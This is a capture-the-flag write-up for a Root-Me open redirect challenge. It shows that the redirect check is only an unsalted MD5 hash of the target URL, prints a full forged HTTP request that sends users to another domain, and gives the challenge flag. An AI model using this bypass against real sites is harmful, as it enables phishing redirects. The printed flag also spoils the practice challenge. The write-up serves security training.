# HTTP - Open redirect

> Find a way to make a redirection to a domain other than those showed on the web page.

<figure><img src="../../.gitbook/assets/1 (101).png" alt=""><figcaption></figcaption></figure>

We can click on any of the options and intercept the request using Burpsuite.

<figure><img src="../../.gitbook/assets/2 (96).png" alt=""><figcaption></figcaption></figure>

```
GET /web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134 HTTP/1.1
```

The request would typically be processed by a web server, which would attempt to access the specified URL (in this case, `https://facebook.com`) and respond accordingly.

The `h` parameter may be some form of hash used for the purpose of authentication.

Let's decode the hash using an online decoder.

<figure><img src="../../.gitbook/assets/3 (83).png" alt=""><figcaption></figcaption></figure>

So the MD5 hashing function was used to encode `https://facebook.com` and the hash was then included in the `h` parameter.

Let's say we want to redirect to `https://openredirect.com`, we would have to set the `h` parameter to the hash of the `url` parameter.

<figure><img src="../../.gitbook/assets/4 (65).png" alt=""><figcaption></figcaption></figure>

## HTTP Request

```
GET /web-serveur/ch52/?url=https://openredirect.com&h=467e5d669ea35a18601efe9bb20f52ad HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://challenge01.root-me.org/web-serveur/ch52/
DNT: 1
Connection: close
Cookie: _ga_SRYSKX09J7=GS1.1.1697302688.4.1.1697302689.0.0.0; _ga=GA1.1.1863804672.1697290591
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

For the final step, we have to send this request to the server.

<figure><img src="../../.gitbook/assets/5 (56).png" alt=""><figcaption></figcaption></figure>

## Flag

```
e6f8a530811d5a479812d7b82fc1a5c5
```
